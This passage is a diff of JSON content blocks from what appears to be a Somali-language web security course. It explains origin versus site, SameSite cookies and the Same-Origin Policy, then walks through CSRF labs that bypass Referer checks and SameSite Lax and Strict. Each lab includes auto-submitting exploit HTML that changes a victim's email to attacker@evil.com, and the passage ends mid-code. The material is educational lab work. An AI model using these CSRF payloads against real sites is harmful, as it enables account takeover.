+       "text": "example.co.uk — site (eTLD waa co.uk).",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b14"
+    },
+    {
+     "type": "para",
+     "html": "Origin waa qayb. Site waa koox. Origin waa local. Site waa global. Labaduba waa trust boundaries laakiin heer kala duwan.",
+     "text": "Origin waa qayb. Site waa koox. Origin waa local. Site waa global. Labaduba waa trust boundaries laakiin heer kala duwan.",
+     "id": "part-7-b15"
+    },
+    {
+     "type": "para",
+     "html": "Origin waa aasaaska ee SOP (Same-Origin Policy). SOP wuxuu yiraahdaa:",
+     "text": "Origin waa aasaaska ee SOP (Same-Origin Policy). SOP wuxuu yiraahdaa:",
+     "id": "part-7-b16"
+    },
+    {
+     "type": "para",
+     "html": "\"JavaScript-ka bogga A ma akhrin karo xogta bogga B haddii origin-yadu kala duwan yihiin.\"",
+     "text": "\"JavaScript-ka bogga A ma akhrin karo xogta bogga B haddii origin-yadu kala duwan yihiin.\"",
+     "id": "part-7-b17"
+    },
+    {
+     "type": "para",
+     "html": "Origin waa isolation. Waa quarantine. Waa sandbox. Wuxuu u sheegaa browser-ka: \"Origin kastaa waa gobol. Ma gudbi karo.\"",
+     "text": "Origin waa isolation. Waa quarantine. Waa sandbox. Wuxuu u sheegaa browser-ka: \"Origin kastaa waa gobol. Ma gudbi karo.\"",
+     "id": "part-7-b18"
+    },
+    {
+     "type": "para",
+     "html": "Origin waa trust boundary oo adag. Laakiin ma ilaalinayso CSRF. CSRF wuxuu ku salaysan yahay cookies, ma aha origin. Cookies-ka waa la diraa site-ka, ma aha origin-ka.",
+     "text": "Origin waa trust boundary oo adag. Laakiin ma ilaalinayso CSRF. CSRF wuxuu ku salaysan yahay cookies, ma aha origin. Cookies-ka waa la diraa site-ka, ma aha origin-ka.",
+     "id": "part-7-b19"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": " Site",
+     "text": "Site",
+     "id": "part-7-b20",
+     "slug": "site"
+    },
+    {
+     "type": "para",
+     "html": "Site waa aasaas ee SameSite. SameSite wuxuu yiraahdaa:",
+     "text": "Site waa aasaas ee SameSite. SameSite wuxuu yiraahdaa:",
+     "id": "part-7-b21"
+    },
+    {
+     "type": "para",
+     "html": "\"Cookie-ga lama diro cross-site. Waa in la diraa same-site.\"",
+     "text": "\"Cookie-ga lama diro cross-site. Waa in la diraa same-site.\"",
+     "id": "part-7-b22"
+    },
+    {
+     "type": "para",
+     "html": "Site waa koox. Waa family.. Wuxuu u sheegaa browser-ka: \"Site kastaa waa qoys. Xubnaha qoyska waa la aqbalayaa.\"",
+     "text": "Site waa koox. Waa family.. Wuxuu u sheegaa browser-ka: \"Site kastaa waa qoys. Xubnaha qoyska waa la aqbalayaa.\"",
+     "id": "part-7-b23"
+    },
+    {
+     "type": "para",
+     "html": ":",
+     "text": ":",
+     "id": "part-7-b24"
+    },
+    {
+     "type": "list",
+     "ordered": true,
+     "items": [
+      {
+       "html": "Sibling domains waa isla site.",
+       "text": "Sibling domains waa isla site.",
+       "level": 0
+      },
+      {
+       "html": "XSS on sibling domain wuxuu u ogolaataa attacker inuu same-site requests sameeyo.",
+       "text": "XSS on sibling domain wuxuu u ogolaataa attacker inuu same-site requests sameeyo.",
+       "level": 0
+      },
+      {
+       "html": "SameSite=Strict ma ilaalinayso sibling domain XSS.",
+       "text": "SameSite=Strict ma ilaalinayso sibling domain XSS.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b25"
+    },
+    {
+     "type": "para",
+     "html": "Gap waa farqiqa u dhexeeya origin iyo site.",
+     "text": "Gap waa farqiqa u dhexeeya origin iyo site.",
+     "id": "part-7-b26"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-7-b27"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "<code>https://cms.example.com</code> iyo <code>https://example.com</code> waa origin kala duwan laakiin isla site.",
+       "text": "https://cms.example.com iyo https://example.com waa origin kala duwan laakiin isla site.",
+       "level": 0
+      },
+      {
+       "html": "SOP wuxuu yiraahdaa: \"Kala duwan.\" SameSite wuxuu yiraahdaa: \"Isku mid.\"",
+       "text": "SOP wuxuu yiraahdaa: \"Kala duwan.\" SameSite wuxuu yiraahdaa: \"Isku mid.\"",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b28"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "Lab-ka 7: Referer Validation Depends on Header Being Present ",
+     "text": "Lab-ka 7: Referer Validation Depends on Header Being Present",
+     "id": "part-7-b29",
+     "slug": "lab-ka-7-referer-validation-depends-on-header-being-present"
+    },
+    {
+     "type": "para",
+     "html": "Lab-kan wuxuu leeyahay Referer validation oo ku xiran jiritaanka header-ka. Haddii Referer maqan yahay, server-ku wuu aqbalayaa.",
+     "text": "Lab-kan wuxuu leeyahay Referer validation oo ku xiran jiritaanka header-ka. Haddii Referer maqan yahay, server-ku wuu aqbalayaa.",
+     "id": "part-7-b30"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Referer",
+     "text": "Referer",
+     "id": "part-7-b31",
+     "slug": "referer"
+    },
+    {
+     "type": "para",
+     "html": "Referer waa context. Waa direction. Waa halka. Waa waxa request-ku ka yimid.",
+     "text": "Referer waa context. Waa direction. Waa halka. Waa waxa request-ku ka yimid.",
+     "id": "part-7-b32"
+    },
+    {
+     "type": "para",
+     "html": "Dhibaatada: Referer waa optional. Browser-ku wuu tirtiri karaa. Attacker-ku wuu tirtiri karaa. Marka, maqnaanshaha waa possible.",
+     "text": "Dhibaatada: Referer waa optional. Browser-ku wuu tirtiri karaa. Attacker-ku wuu tirtiri karaa. Marka, maqnaanshaha waa possible.",
+     "id": "part-7-b33"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Sida Loo Tijaabiyo",
+     "text": "Sida Loo Tijaabiyo",
+     "id": "part-7-b34",
+     "slug": "sida-loo-tijaabiyo"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 1: Login wiener",
+     "text": "Tallaabo 1: Login wiener",
+     "id": "part-7-b35"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Eeg request-ka: <code>Referer: https://target.com/my-account</code>.",
+       "text": "Eeg request-ka: Referer: https://target.com/my-account.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b36"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 2: Tijaabi Referer",
+     "text": "Tallaabo 2: Tijaabi Referer",
+     "id": "part-7-b37"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Beddel <code>Referer: https://evil.com</code> → waa la diiday.",
+       "text": "Beddel Referer: https://evil.com → waa la diiday.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b38"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 3: Tirtir Referer",
+     "text": "Tallaabo 3: Tirtir Referer",
+     "id": "part-7-b39"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Tirtir <code>Referer</code> header-ka oo dhan.",
+       "text": "Tirtir Referer header-ka oo dhan.",
+       "level": 0
+      },
+      {
+       "html": "Riix Send.",
+       "text": "Riix Send.",
+       "level": 0
+      },
+      {
+       "html": "Haddii la aqbalo → waa vulnerable.",
+       "text": "Haddii la aqbalo → waa vulnerable.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b40"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 4: Samee exploit",
+     "text": "Tallaabo 4: Samee exploit",
+     "id": "part-7-b41"
+    },
+    {
+     "type": "code",
+     "lang": "html",
+     "lines": [
+      "<meta name=\"referrer\" content=\"no-referrer\">",
+      "<form method=\"POST\" action=\"https://LAB-ID.web-security-academy.net/my-account/change-email\">",
+      "    <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">",
+      "</form>",
+      "<script>document.forms[0].submit();</script>"
+     ],
+     "id": "part-7-b42"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 5: Deliver",
+     "text": "Tallaabo 5: Deliver",
+     "id": "part-7-b43"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Beddel email-ka.",
+       "text": "Beddel email-ka.",
+       "level": 0
+      },
+      {
+       "html": "Store, Deliver.",
+       "text": "Store, Deliver.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b44"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "Lab-ka 8: Broken Referer Validation ",
+     "text": "Lab-ka 8: Broken Referer Validation",
+     "id": "part-7-b45",
+     "slug": "lab-ka-8-broken-referer-validation"
+    },
+    {
+     "type": "para",
+     "html": "Lab-kan wuxuu leeyahay Referer validation oo isticmaala substring match. Wuxuu aqbalayaa <code>Referer: https://evil.com/?target.com</code>.",
+     "text": "Lab-kan wuxuu leeyahay Referer validation oo isticmaala substring match. Wuxuu aqbalayaa Referer: https://evil.com/?target.com.",
+     "id": "part-7-b46"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Substring",
+     "text": "Substring",
+     "id": "part-7-b47",
+     "slug": "substring"
+    },
+    {
+     "type": "para",
+     "html": "Substring waa qayb. Waa fragment. Waa piece. Waa wax ka mid ah.",
+     "text": "Substring waa qayb. Waa fragment. Waa piece. Waa wax ka mid ah.",
+     "id": "part-7-b48"
+    },
+    {
+     "type": "para",
+     "html": "Substring wuxuu yiraahdaa: \"Haddii <code>target.com</code> uu ku jiro <code>Referer</code>, waa sax.\" Laakiin <code>target.com</code> wuxuu ku jiri karaa meel kasta:",
+     "text": "Substring wuxuu yiraahdaa: \"Haddii target.com uu ku jiro Referer, waa sax.\" Laakiin target.com wuxuu ku jiri karaa meel kasta:",
+     "id": "part-7-b49"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "<code>https://target.com/</code> — host.",
+       "text": "https://target.com/ — host.",
+       "level": 0
+      },
+      {
+       "html": "<code>https://evil.com/?target.com</code> — query string.",
+       "text": "https://evil.com/?target.com — query string.",
+       "level": 0
+      },
+      {
+       "html": "<code>https://evil.com/#target.com</code> — fragment.",
+       "text": "https://evil.com/#target.com — fragment.",
+       "level": 0
+      },
+      {
+       "html": "<code>https://target.com.evil.com/</code> — subdomain.",
+       "text": "https://target.com.evil.com/ — subdomain.",
+       "level": 0
+      },
+      {
+       "html": "<code>https://evil.com/target.com</code> — path.",
+       "text": "https://evil.com/target.com — path.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b50"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Falsafadda Contains vs Equals",
+     "text": "Falsafadda Contains vs Equals",
+     "id": "part-7-b51",
+     "slug": "falsafadda-contains-vs-equals"
+    },
+    {
+     "type": "para",
+     "html": "Contains waa inclusion. Equals waa identity.",
+     "text": "Contains waa inclusion. Equals waa identity.",
+     "id": "part-7-b52"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "<code>Contains</code> wuxuu yiraahdaa: \"Waxaa jira qayb.\"",
+       "text": "Contains wuxuu yiraahdaa: \"Waxaa jira qayb.\"",
+       "level": 0
+      },
+      {
+       "html": "<code>Equals</code> wuxuu yiraahdaa: \"Waa isla mid.\"",
+       "text": "Equals wuxuu yiraahdaa: \"Waa isla mid.\"",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b53"
+    },
+    {
+     "type": "para",
+     "html": "Contains waa weak. Equals waa strong. Marka aad xaqiijinayso identity, waa in la isticmaalaa Equals, ma aha Contains.",
+     "text": "Contains waa weak. Equals waa strong. Marka aad xaqiijinayso identity, waa in la isticmaalaa Equals, ma aha Contains.",
+     "id": "part-7-b54"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-7-b55"
+    },
+    {
+     "type": "code",
+     "lang": null,
+     "lines": [
+      "Contains: \"https://evil.com/?target.com\" contains \"target.com\" → TRUE",
+      "Equals:   \"https://evil.com/?target.com\" == \"target.com\" → FALSE"
+     ],
+     "id": "part-7-b56"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 1: Login wiener",
+     "text": "Tallaabo 1: Login wiener",
+     "id": "part-7-b57"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Eeg request-ka: <code>Referer: https://target.com/my-account</code>.",
+       "text": "Eeg request-ka: Referer: https://target.com/my-account.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b58"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 2: Tijaabi Referer",
+     "text": "Tallaabo 2: Tijaabi Referer",
+     "id": "part-7-b59"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Beddel <code>Referer: https://evil.com</code> → waa la diiday.",
+       "text": "Beddel Referer: https://evil.com → waa la diiday.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b60"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 3: Tijaabi substring",
+     "text": "Tallaabo 3: Tijaabi substring",
+     "id": "part-7-b61"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Beddel <code>Referer: https://evil.com/?target.com</code> → waa la aqbalay.",
+       "text": "Beddel Referer: https://evil.com/?target.com → waa la aqbalay.",
+       "level": 0
+      },
+      {
+       "html": "Gunaanad: Substring match.",
+       "text": "Gunaanad: Substring match.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b62"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 4: Samee exploit",
+     "text": "Tallaabo 4: Samee exploit",
+     "id": "part-7-b63"
+    },
+    {
+     "type": "code",
+     "lang": "html",
+     "lines": [
+      "<html>",
+      "<head>",
+      "    <meta name=\"referrer\" content=\"unsafe-url\">",
+      "</head>",
+      "<body>",
+      "    <form method=\"POST\" action=\"https://LAB-ID.web-security-academy.net/my-account/change-email\">",
+      "        <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">",
+      "    </form>",
+      "    <script>",
+      "        history.pushState(\"\", \"\", \"/?target.com\");",
+      "        document.forms[0].submit();",
+      "    </script>",
+      "</body>",
+      "</html>"
+     ],
+     "id": "part-7-b64"
+    },
+    {
+     "type": "para",
+     "html": "Ogeysiis: Exploit server Head section-ka ku dar <code>Referrer-Policy: unsafe-url</code>.",
+     "text": "Ogeysiis: Exploit server Head section-ka ku dar Referrer-Policy: unsafe-url.",
+     "callout": "note",
+     "id": "part-7-b65"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 5: Deliver",
+     "text": "Tallaabo 5: Deliver",
+     "id": "part-7-b66"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Beddel email-ka.",
+       "text": "Beddel email-ka.",
+       "level": 0
+      },
+      {
+       "html": "Store, Deliver.",
+       "text": "Store, Deliver.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b67"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "Lab-ka 9: SameSite Lax via Method Override ",
+     "text": "Lab-ka 9: SameSite Lax via Method Override",
+     "id": "part-7-b68",
+     "slug": "lab-ka-9-samesite-lax-via-method-override"
+    },
+    {
+     "type": "para",
+     "html": "Lab-kan wuxuu leeyahay SameSite=Lax. Cookie-ga lama diro cross-site POST, laakiin waa la diraa cross-site GET top-level navigation. Server-ku wuxuu ogolaadaa <code>_method=POST</code>.",
+     "text": "Lab-kan wuxuu leeyahay SameSite=Lax. Cookie-ga lama diro cross-site POST, laakiin waa la diraa cross-site GET top-level navigation. Server-ku wuxuu ogolaadaa _method=POST.",
+     "id": "part-7-b69"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Top-Level Navigation",
+     "text": "Top-Level Navigation",
+     "id": "part-7-b70",
+     "slug": "top-level-navigation"
+    },
+    {
+     "type": "para",
+     "html": "Top-level navigation waa marka browser-ku uu si toos ah ugu leexdo URL cusub. Waa user-intended. Waa deliberate. Waa conscious.",
+     "text": "Top-level navigation waa marka browser-ku uu si toos ah ugu leexdo URL cusub. Waa user-intended. Waa deliberate. Waa conscious.",
+     "id": "part-7-b71"
+    },
+    {
+     "type": "para",
+     "html": "Top-level navigation waa signal. Waa marker. Waa proof of intent. Marka user-ku uu booqdo <code>bank.com</code>, waa intentional. Marka <code>&lt;img&gt;</code> uu soo raro <code>bank.com</code>, waa incidental.",
+     "text": "Top-level navigation waa signal. Waa marker. Waa proof of intent. Marka user-ku uu booqdo bank.com, waa intentional. Marka <img> uu soo raro bank.com, waa incidental.",
+     "id": "part-7-b72"
+    },
+    {
+     "type": "para",
+     "html": "SameSite=Lax wuxuu aaminsan yahay top-level navigation. Wuxuu yiraahdaa: \"Haddii uu top-level yahay, waa user-intended.\" Laakiin top-level navigation wuxuu noqon karaa attacker-controlled:",
+     "text": "SameSite=Lax wuxuu aaminsan yahay top-level navigation. Wuxuu yiraahdaa: \"Haddii uu top-level yahay, waa user-intended.\" Laakiin top-level navigation wuxuu noqon karaa attacker-controlled:",
+     "id": "part-7-b73"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "<code>document.location = \"https://...\"</code> — top-level.",
+       "text": "document.location = \"https://...\" — top-level.",
+       "level": 0
+      },
+      {
+       "html": "<code>&lt;a href=\"</code><code>https:</code><code>//...\"&gt;</code> — top-level.",
+       "text": "<a href=\"https://...\"> — top-level.",
+       "level": 0
+      },
+      {
+       "html": "<code>&lt;form action=\"</code><code>https:</code><code>//...\"&gt;</code> — top-level.",
+       "text": "<form action=\"https://...\"> — top-level.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b74"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Method Override",
+     "text": "Method Override",
+     "id": "part-7-b75",
+     "slug": "method-override"
+    },
+    {
+     "type": "para",
+     "html": "Method override Waa marka method-ka la beddelo. Waa marka POST noqdo GET ama GET noqdo POST.",
+     "text": "Method override Waa marka method-ka la beddelo. Waa marka POST noqdo GET ama GET noqdo POST.",
+     "id": "part-7-b76"
+    },
+    {
+     "type": "para",
+     "html": "Method override wuxuu yiraahdaa: \"Haddii method-ku aanu shaqeyn, isku day mid kale.\"",
+     "text": "Method override wuxuu yiraahdaa: \"Haddii method-ku aanu shaqeyn, isku day mid kale.\"",
+     "id": "part-7-b77"
+    },
+    {
+     "type": "para",
+     "html": "Method override wuxuu u ogolaataa attacker inuu GET u beddelo POST. SameSite=Lax wuxuu aqbalayaa GET top-level. Marka, CSRF wuu shaqeeyaa.",
+     "text": "Method override wuxuu u ogolaataa attacker inuu GET u beddelo POST. SameSite=Lax wuxuu aqbalayaa GET top-level. Marka, CSRF wuu shaqeeyaa.",
+     "id": "part-7-b78"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-7-b79"
+    },
+    {
+     "type": "code",
+     "lang": "text",
+     "lines": [
+      "GET /change-email?email=attacker&_method=POST"
+     ],
+     "id": "part-7-b80"
+    },
+    {
+     "type": "para",
+     "html": "Server-ku wuxuu u arkaa POST. SameSite=Lax wuxuu u arkaa GET. Labaduba waa kala duwan. yihiin Waa gap.",
+     "text": "Server-ku wuxuu u arkaa POST. SameSite=Lax wuxuu u arkaa GET. Labaduba waa kala duwan. yihiin Waa gap.",
+     "id": "part-7-b81"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Sida Loo Tijaabiyo",
+     "text": "Sida Loo Tijaabiyo",
+     "id": "part-7-b82",
+     "slug": "sida-loo-tijaabiyo"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 1: Login wiener",
+     "text": "Tallaabo 1: Login wiener",
+     "id": "part-7-b83"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Eeg <code>Set-Cookie</code>: <code>SameSite=Lax</code>.",
+       "text": "Eeg Set-Cookie: SameSite=Lax.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b84"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 2: Tijaabi GET",
+     "text": "Tallaabo 2: Tijaabi GET",
+     "id": "part-7-b85"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Repeater ku dir GET request.",
+       "text": "Repeater ku dir GET request.",
+       "level": 0
+      },
+      {
+       "html": "Riix Send.",
+       "text": "Riix Send.",
+       "level": 0
+      },
+      {
+       "html": "Haddii la aqbalo → waa shaqeynaysaa.",
+       "text": "Haddii la aqbalo → waa shaqeynaysaa.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b86"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 3: Tijaabi method override",
+     "text": "Tallaabo 3: Tijaabi method override",
+     "id": "part-7-b87"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Ku dar <code>_method=POST</code> query string-ka.",
+       "text": "Ku dar _method=POST query string-ka.",
+       "level": 0
+      },
+      {
+       "html": "Riix Send.",
+       "text": "Riix Send.",
+       "level": 0
+      },
+      {
+       "html": "Haddii la aqbalo → waa vulnerable.",
+       "text": "Haddii la aqbalo → waa vulnerable.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b88"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 4: Samee exploit",
+     "text": "Tallaabo 4: Samee exploit",
+     "id": "part-7-b89"
+    },
+    {
+     "type": "code",
+     "lang": "html",
+     "lines": [
+      "<script>",
+      "    document.location = \"https://LAB-ID.web-security-academy.net/my-account/change-email?email=attacker@evil.com&_method=POST\";",
+      "</script>"
+     ],
+     "id": "part-7-b90"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 5: Deliver",
+     "text": "Tallaabo 5: Deliver",
+     "id": "part-7-b91"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Beddel email-ka.",
+       "text": "Beddel email-ka.",
+       "level": 0
+      },
+      {
+       "html": "Store, Deliver.",
+       "text": "Store, Deliver.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b92"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "Lab-ka 10: SameSite Strict via Client-Side Redirect — ",
+     "text": "Lab-ka 10: SameSite Strict via Client-Side Redirect —",
+     "id": "part-7-b93",
+     "slug": "lab-ka-10-samesite-strict-via-client-side-redirect"
+    },
+    {
+     "type": "para",
+     "html": "Lab-kan wuxuu leeyahay SameSite=Strict. Cookie-ga lama diro cross-site . Laakiin lab-kan wuxuu leeyahay client-side redirect gadget oo sameeya request labaad oo same-site ah.",
+     "text": "Lab-kan wuxuu leeyahay SameSite=Strict. Cookie-ga lama diro cross-site . Laakiin lab-kan wuxuu leeyahay client-side redirect gadget oo sameeya request labaad oo same-site ah.",
+     "id": "part-7-b94"
+    },
+    {
+     "type": "para",
+     "html": "Lab-kan wuxuu ku barayaa in SameSite=Strict aanu ilaalin haddii site-ku leeyahay gadget. Wuxuu ku barayaa in defense-in-depth aanu ku filnayn.",
+     "text": "Lab-kan wuxuu ku barayaa in SameSite=Strict aanu ilaalin haddii site-ku leeyahay gadget. Wuxuu ku barayaa in defense-in-depth aanu ku filnayn.",
+     "id": "part-7-b95"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": " Gadget-ka",
+     "text": "Gadget-ka",
+     "id": "part-7-b96",
+     "slug": "gadget-ka"
+    },
+    {
+     "type": "para",
+     "html": "Gadget wuxuu u ogolaataa attacker inuu u gudbo defense-ka. Wuxuu u ogolaataa attacker inuu sameeyo request labaad.",
+     "text": "Gadget wuxuu u ogolaataa attacker inuu u gudbo defense-ka. Wuxuu u ogolaataa attacker inuu sameeyo request labaad.",
+     "id": "part-7-b97"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-7-b98"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Request 1: Cross-site, top-level, GET → <code>/post/comment/confirmation</code><code>?postId</code><code>=...</code> (ma u baahna cookie).",
+       "text": "Request 1: Cross-site, top-level, GET → /post/comment/confirmation?postId=... (ma u baahna cookie).",
+       "level": 0
+      },
+      {
+       "html": "Request 2: Same-site, top-level, GET → <code>/my-account/change-email</code><code>?email</code><code>=...</code> (cookie waa la diraa).",
+       "text": "Request 2: Same-site, top-level, GET → /my-account/change-email?email=... (cookie waa la diraa).",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b99"
+    },
+    {
+     "type": "para",
+     "html": "Request 1 waa bridge. Request 2 waa action. Labaduba waa same-site. SameSite=Strict wuxuu aqbalayaa same-site. Marka, CSRF wuu shaqeeyaa.",
+     "text": "Request 1 waa bridge. Request 2 waa action. Labaduba waa same-site. SameSite=Strict wuxuu aqbalayaa same-site. Marka, CSRF wuu shaqeeyaa.",
+     "id": "part-7-b100"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Client-Side Redirect",
+     "text": "Client-Side Redirect",
+     "id": "part-7-b101",
+     "slug": "client-side-redirect"
+    },
+    {
+     "type": "para",
+     "html": "Client-side redirect Waa marka JavaScript uu sameeyo redirect. Waa marka browser-ku uu sameeyo request labaad.",
+     "text": "Client-side redirect Waa marka JavaScript uu sameeyo redirect. Waa marka browser-ku uu sameeyo request labaad.",
+     "id": "part-7-b102"
+    },
+    {
+     "type": "para",
+     "html": "Client-side redirect wuxuu u arkaa browser-ka in request-ka labaad uu yimid isla site-ka. Waa same-site. Cookie-ga waa la diraa.",
+     "text": "Client-side redirect wuxuu u arkaa browser-ka in request-ka labaad uu yimid isla site-ka. Waa same-site. Cookie-ga waa la diraa.",
+     "id": "part-7-b103"
+    },
+    {
+     "type": "para",
+     "html": "Dhibaatada: Client-side redirect wuxuu u ogolaataa attacker inuu maamulo halka request-ku u socdo. Wuxuu u ogolaataa attacker inuu sameeyo request labaad.",
+     "text": "Dhibaatada: Client-side redirect wuxuu u ogolaataa attacker inuu maamulo halka request-ku u socdo. Wuxuu u ogolaataa attacker inuu sameeyo request labaad.",
+     "id": "part-7-b104"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-7-b105"
+    },
+    {
+     "type": "code",
+     "lang": "javascript",
+     "lines": [
+      "window.location.href = '/post/' + postId;  // postId = '1/../../my-account/change-email?email=...'"
+     ],
+     "id": "part-7-b106"
+    },
+    {
+     "type": "para",
+     "html": "Browser-ku wuxuu normalize-gareeyaa:",
+     "text": "Browser-ku wuxuu normalize-gareeyaa:",
+     "id": "part-7-b107"
+    },
+    {
+     "type": "code",
+     "lang": "text",
+     "lines": [
+      "/post/1/../../my-account/change-email?email=...",
+      "→ /my-account/change-email?email=..."
+     ],
+     "id": "part-7-b108"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": " Sida Loo Tijaabiyo",
+     "text": "Sida Loo Tijaabiyo",
+     "id": "part-7-b109",
+     "slug": "sida-loo-tijaabiyo"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 1: Login wiener",
+     "text": "Tallaabo 1: Login wiener",
+     "id": "part-7-b110"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Eeg <code>Set-Cookie</code>: <code>SameSite=Strict</code>.",
+       "text": "Eeg Set-Cookie: SameSite=Strict.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b111"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 2: Tijaabi GET",
+     "text": "Tallaabo 2: Tijaabi GET",
+     "id": "part-7-b112"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Repeater ku dir GET request.",
+       "text": "Repeater ku dir GET request.",
+       "level": 0
+      },
+      {
+       "html": "Riix Send.",
+       "text": "Riix Send.",
+       "level": 0
+      },
+      {
+       "html": "Haddii la aqbalo → waa shaqeynaysaa.",
+       "text": "Haddii la aqbalo → waa shaqeynaysaa.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b113"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 3: Hel gadget",
+     "text": "Tallaabo 3: Hel gadget",
+     "id": "part-7-b114"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Comment soo dir blog post.",
+       "text": "Comment soo dir blog post.",
+       "level": 0
+      },
+      {
+       "html": "Eeg Burp: <code>/post/comment/confirmation</code><code>?postId</code><code>=1</code>.",
+       "text": "Eeg Burp: /post/comment/confirmation?postId=1.",
+       "level": 0
+      },
+      {
+       "html": "Eeg JavaScript: <code>commentConfirmationRedirect.js</code>.",
+       "text": "Eeg JavaScript: commentConfirmationRedirect.js.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b115"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 4: Tijaabi path traversal",
+     "text": "Tallaabo 4: Tijaabi path traversal",
+     "id": "part-7-b116"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Browser-ka booqo: <code>/post/comment/confirmation</code><code>?postId</code><code>=1/../../my-account</code>.",
+       "text": "Browser-ka booqo: /post/comment/confirmation?postId=1/../../my-account.",
+       "level": 0
+      },
+      {
+       "html": "Haddii uu u leexdo <code>/my-account</code> → waa shaqeynaysaa.",
+       "text": "Haddii uu u leexdo /my-account → waa shaqeynaysaa.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b117"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 5: Samee exploit",
+     "text": "Tallaabo 5: Samee exploit",
+     "id": "part-7-b118"
+    },
+    {
+     "type": "code",
+     "lang": "html",
+     "lines": [
+      "<script>",
